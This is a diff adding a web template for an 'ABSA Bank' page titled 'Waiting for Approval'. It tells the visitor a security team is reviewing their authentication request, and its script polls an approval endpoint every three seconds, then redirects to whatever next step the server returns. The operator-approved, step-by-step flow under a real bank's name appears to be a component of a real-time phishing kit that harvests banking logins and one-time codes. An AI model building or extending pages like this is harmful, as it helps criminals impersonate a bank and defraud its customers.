@@ -1,0 +1,204 @@
+{% extends "base.html" %}
+
+{% block title %}Waiting for Approval - ABSA Bank{% endblock %}
+
+{% block extra_css %}
+<style>
+  .waiting-container {
+    max-width: 600px;
+    margin: 50px auto;
+    padding: 40px;
+    background: #fff;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    text-align: center;
+  }
+
+  .waiting-icon {
+    width: 80px;
+    height: 80px;
+    background: var(--accent);
+    border-radius: 50%;
+    margin: 0 auto 30px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    animation: pulse 2s infinite;
+  }
+
+  @keyframes pulse {
+    0% { transform: scale(1); opacity: 1; }
+    50% { transform: scale(1.1); opacity: 0.7; }
+    100% { transform: scale(1); opacity: 1; }
+  }
+
+  .waiting-icon::before {
+    content: '⏳';
+    font-size: 40px;
+  }
+
+  .waiting-title {
+    color: var(--primary);
+    font-size: 24px;
+    margin-bottom: 15px;
+    font-weight: 600;
+  }
+
+  .waiting-message {
+    color: var(--text-light);
+    font-size: 16px;
+    line-height: 1.5;
+    margin-bottom: 30px;
+  }
+
+  .waiting-details {
+    background: #f8f9fa;
+    padding: 20px;
+    border-radius: 4px;
+    margin-bottom: 30px;
+  }
+
+  .detail-row {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    font-size: 14px;
+  }
+
+  .detail-row:last-child {
+    margin-bottom: 0;
+  }
+
+  .detail-label {
+    color: var(--text-light);
+  }
+
+  .detail-value {
+    color: var(--text-dark);
+    font-weight: 600;
+  }
+
+  .progress-bar {
+    width: 100%;
+    height: 4px;
+    background: #e9ecef;
+    border-radius: 2px;
+    overflow: hidden;
+    margin-bottom: 20px;
+  }
+
+  .progress-fill {
+    height: 100%;
+    background: var(--accent);
+    width: 0%;
+    animation: progress 3s infinite;
+  }
+
+  @keyframes progress {
+    0% { width: 0%; }
+    50% { width: 60%; }
+    100% { width: 0%; }
+  }
+
+  .refresh-info {
+    color: var(--text-light);
+    font-size: 12px;
+    margin-top: 20px;
+  }
+
+  .cancel-btn {
+    background: #6c757d;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 14px;
+    margin-top: 20px;
+  }
+
+  .cancel-btn:hover {
+    background: #5a6268;
+  }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="waiting-container">
+  <div class="waiting-icon"></div>
+  
+  <h2 class="waiting-title">Waiting for Approval</h2>
+  
+  <p class="waiting-message">
+    Your authentication request is being reviewed by our security team. 
+    Please wait while we verify your information.
+  </p>
+
+  <div class="waiting-details">
+    <div class="detail-row">
+      <span class="detail-label">Step:</span>
+      <span class="detail-value">{{ step_name }}</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-label">Session ID:</span>
+      <span class="detail-value">{{ session_id[:8] }}...</span>
+    </div>
+    <div class="detail-row">
+      <span class="detail-label">Submitted:</span>
+      <span class="detail-value">{{ submitted_time }}</span>
+    </div>
+  </div>
+
+  <div class="progress-bar">
+    <div class="progress-fill"></div>
+  </div>
+
+  <p class="refresh-info">
+    This page will automatically refresh when approval is received.
+  </p>
+
+  <button onclick="cancelRequest()" class="cancel-btn">Cancel Request</button>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  // Check for approval every 3 seconds
+  function checkApproval() {
+    fetch('/check-approval/{{ request_id }}')
+      .then(response => response.json())
+      .then(data => {
+        if (data.approved) {
+          // Redirect to next step
+          window.location.href = data.next_url;
+        } else if (data.rejected) {
+          alert('Your request has been rejected. Please try again.');
+          window.location.href = '{{ url_for("index") }}';
+        }
+      })
+      .catch(error => {
+        console.error('Error checking approval:', error);
+      });
+  }
+
+  function cancelRequest() {
+    if (confirm('Are you sure you want to cancel this request?')) {
+      fetch('/cancel-request/{{ request_id }}', {
+        method: 'POST'
+      })
+      .then(response => response.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = '{{ url_for("index") }}';
+        }
+      });
+    }
+  }
+
+  // Start checking for approval
+  setInterval(checkApproval, 3000);
+  
+  // Initial check
+  checkApproval();
+</script>
+{% endblock %}
